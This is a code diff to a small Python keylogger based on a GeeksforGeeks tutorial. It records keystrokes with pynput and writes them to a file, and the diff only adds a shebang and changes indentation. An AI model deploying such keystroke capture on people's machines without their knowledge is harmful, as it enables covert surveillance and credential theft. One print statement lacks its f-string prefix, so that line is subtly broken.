@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 # https://www.geeksforgeeks.org/python/how-to-use-pynput-to-make-a-keylogger/
 # keylogger using pynput module
 
@@ -10,7 +12,7 @@ keys = []
 def on_press(key):
 	keys.append(key)
 	write_file(keys)
-	
+
 	try:
 		print('alphanumeric key {key.char} pressed')
 	except AttributeError:
@@ -33,15 +35,15 @@ def write_file(keys):
 				f.write(f'[{k}]')
 			# Adding a space after each key for readability
 			f.write(' ')
-		keys.clear()	# Clearing the keys list after writing to the file
-			
+		keys.clear()  # Clearing the keys list after writing to the file
+
 
 def on_release(key):
-	print(f'{key} released')
-	if key == Key.esc:
-		# Stop listener
-		return False
+    print(f'{key} released')
+    if key == Key.esc:
+        # Stop listener
+        return False
 
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
-	listener.join()
+    listener.join()
